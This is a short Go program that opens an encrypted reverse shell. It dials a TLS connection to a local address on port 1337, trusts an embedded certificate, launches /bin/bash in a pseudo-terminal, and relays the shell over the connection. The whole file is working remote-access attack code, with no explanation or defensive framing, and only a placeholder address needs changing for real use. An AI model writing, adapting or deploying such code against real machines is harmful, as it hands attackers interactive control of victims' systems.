package main

import (
	"crypto/tls"
	"crypto/x509"
	_ "embed"
	"io"
	"log"
	"os/exec"

	"github.com/creack/pty"
)

var lAddr string = "127.0.0.1:1337"
var binPath string = "/bin/bash"

//go:embed server.csr
var cert []byte

func errCheck(err error) {
	if err != nil {
		log.Fatalf("%v", err)
	}
}

func main() {
	certs := x509.NewCertPool()
	certs.AppendCertsFromPEM(cert)
	config := &tls.Config{RootCAs: certs}
	conn, err := tls.Dial("tcp", lAddr, config)
	errCheck(err)
	defer conn.Close()
	log.Printf("Sending %s to %s", binPath, lAddr)
	cmd := exec.Command(binPath)
	p, err := pty.Start(cmd)
	errCheck(err)
	rp, wp := io.Pipe()
	doneChan := make(chan int)
	go func() {
		io.Copy(conn, rp)
		doneChan <- 0
	}()
	go func() {
		io.Copy(wp, p)
		doneChan <- 0
	}()
	go func() {
		io.Copy(p, conn)
		doneChan <- 0
	}()
	<-doneChan
	log.Println("Connection closed, exiting")
}
